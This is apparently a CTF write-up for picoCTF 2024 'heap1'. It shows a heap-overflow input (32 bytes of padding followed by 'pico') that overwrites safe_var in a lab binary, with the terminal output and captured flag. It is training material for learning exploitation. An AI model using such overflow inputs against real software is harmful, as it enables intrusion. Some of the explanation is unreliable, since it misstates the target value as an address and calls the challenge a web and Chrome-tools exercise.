
<!DOCTYPE html>
<html>

<body>
    <h1>heap1- picoctf2024</h1>

    <h2>Challenge Description</h2>
    <p>   AUTHOR: ABRXS, PR1OR1TYQ

Description
Can you control your overflow?
Download the binary <a href="https://artifacts.picoctf.net/c_tethys/1/chall">here</a> .
Download the source <a href="https://artifacts.picoctf.net/c_tethys/1/chall.c">here</a> .
Additional details will be available after launching your challenge instance.
       
 
</p>
 
    <h2>Solution Approach</h2>
   Here are the steps we took to solve the challenge: 
      we download files 
<code>
$wget https://artifacts.picoctf.net/c_tethys/1/chall

$wget https://artifacts.picoctf.net/c_tethys/1/chall.c
</code>
and  run see this part of code
<code>
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
</code>
it say for win we should comapre safe_var and pico and if equal can get flag 
so should change 0x55c4b7a0f6d0(safe_var) to pico for get flag.
<code>
 
Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x55c4b7a0f6b0  ->   pico
+-------------+----------------+
[*]   0x55c4b7a0f6d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

</code>
we see code and see that for get flag   exploit this program and trigger the check_win() function, you need to overwrite the value of safe_var with the desired value "0x56062334b6b0".
so create input with 32 and add it to pico to change pico value and safevar and get flag like this
<code>
┌──(kali㉿kali)-[~/…/blog/2024/pico2024/heap1]
└─$ ./chall

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x558c2e5a06b0  ->   pico
+-------------+----------------+
[*]   0x558c2e5a06d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: 0123456789abcdefghijklmnopqrstuvpico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x558c2e5a06b0  ->   0123456789abcdefghijklmnopqrstuvpico
+-------------+----------------+
[*]   0x558c2e5a06d0  ->   pico       
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_79ee3270}



</code>

   
    </ol>
<br>
    <h2>Flag</h2>
    <p class="flag">picoCTF{starting_to_get_the_hang_79ee3270}

</p>

    <h2>Conclusion</h2>
    <p>this is a very   easy chanllenge for work on develper tools in in chrome and web exploitations</p>
</body>
</html>

 
dis